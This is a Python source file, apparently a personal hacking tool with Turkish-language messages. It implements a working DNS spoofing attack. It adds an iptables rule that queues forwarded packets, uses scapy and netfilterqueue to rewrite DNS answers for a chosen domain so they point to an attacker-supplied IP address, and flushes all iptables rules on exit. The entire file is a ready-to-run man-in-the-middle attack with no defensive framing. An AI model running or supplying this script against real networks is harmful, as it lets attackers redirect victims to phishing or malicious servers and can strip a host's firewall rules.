#!/usr/bin/env python 3.7.2
# -*- coding: utf-8 -*-
import sys
import os
from termcolor import colored
try:
	import scapy.all as scapy
except KeyboardInterrupt:
	print(colored("\n[-] CTRL+C basıldı.Lütfen bekleyiniz...", "red"))
	print(colored("[-] Uygulamadan çıkış yapıldı!", "red"))
	sys.exit()
import netfilterqueue
import argparse
import tldextract


class DNSSPOOF():
	def __init__(self):
		self.about()
		self.script_desc()
		self.url=""
		self.redirect=""
		self.ip_forward(1)
		self.url_extract()

	def arguman_al(self):
		parse=argparse.ArgumentParser()
		parse.add_argument("--u","--url",dest="url",help="DNS spoofing islemi yapilacak url")
		parse.add_argument("--r","--redirect",dest="redirect",help="Yonlendirilecek IP adresi")
		options=parse.parse_args()
		if not options.url:
			parse.error('[-] Lütfen bir hedef belirleyiniz,daha fazla bilgi için --help kullanın.')
		elif not options.redirect:
			parse.error("[-] Lütfen  yönlendirilecek adresi belirleyiniz,daha fazla bilgi için --help kullanın.")
		else:
			return options

	def url_extract(self):
		options = self.arguman_al()
		self.url = tldextract.extract(options.url)
		self.url = ("{}.{}".format(self.url.domain, self.url.suffix))
		self.redirect = options.redirect

	def netfilterqueue(self):
		queue = netfilterqueue.NetfilterQueue()
		queue.bind(0, self.processPacket)
		queue.run()


	def processPacket(self,packet):
		scapy_packet=scapy.IP(packet.get_payload())
		if scapy_packet.haslayer(scapy.DNSRR):
			qname =(scapy_packet[scapy.DNSQR].qname).decode("utf-8")
			if self.url in qname:
				print("[+] Spoofing target >> "+colored(self.url,"green"))
				cevap=scapy.DNSRR(rrname=qname,rdata=self.redirect)
				scapy_packet[scapy.DNS].an=cevap
				scapy_packet[scapy.DNS].ancount=1
				try:
					del scapy_packet[scapy.IP].len
					del scapy_packet[scapy.IP].chksum
					del scapy_packet[scapy.UDP].len
					del scapy_packet[scapy.UDP].chksum
				except IndexError:
					pass
				packet.set_payload(bytes(scapy_packet))
		packet.accept()


	def ip_forward(self,value):
		if value==1:
			os.system('iptables -I FORWARD -j NFQUEUE --queue-num 0')
		elif value==2:
			os.system('iptables --flush')



	def script_desc(self):
		self.program = "dns_spoof"
		self.kullanim ="Kullanim: python dns_spoof.py --url www.example.com --redirect ip_adress"
		self.description = "DNS isteklerini veya trafiği kendi istediğiniz yere yönlendirerek hedef web sitesini manipüle etmenize yarayan bir script."


	def about(self):
		print(colored("  _____  _   _  _____    _____                    __ ", "green"))
		print(colored(" |  __ \| \ | |/ ____|  / ____|                  / _|", "green"))
		print(colored(" | |  | |  \| | (___   | (___  _ __   ___   ___ | |_ ", "green"))
		print(colored(" | |  | | . ` |\___ \   \___ \| '_ \ / _ \ / _ \|  _|", "green"))
		print(colored(" | |__| | |\  |____) |  ____) | |_) | (_) | (_) | |  ", "green"))
		print(colored(" |_____/|_| \_|_____/  |_____/| .__/ \___/ \___/|_|  ", "green"))
		print(colored("                              | |                    ", "green"))
		print(colored("                              |_|                    ", "green"))
		print(colored("# ==============================================================================", "green"))
		print(colored("# author      	:", "green") + "Mustafa Dalga")
		print(colored("# linkedin    	:", "green") + "https://www.linkedin.com/in/mustafadalga")
		print(colored("# github      	:", "green") + "https://github.com/mustafadalga")
		print(colored("# description 	:", "green") + "DNS isteklerini veya trafiği kendi istediğiniz yere yönlendirerek hedef web sitesini manipüle etmenize yarayan bir script.")
		print(colored("# date        	:", "green") + "19.06.2019")
		print(colored("# version     	:", "green") + "1.0")
		print(colored("# python_version:", "green") + "3.7.2")
		print(colored("# ==============================================================================", "green"))


try:
	dnsspoof=DNSSPOOF()
	dnsspoof.netfilterqueue()
except KeyboardInterrupt:
	dnsspoof.ip_forward(2)
	print(colored("\n[-] CTRL+C basıldı. Lütfen bekleyiniz...", "red"))
	print(colored("[-] Uygulamadan çıkış yapıldı!", "red"))
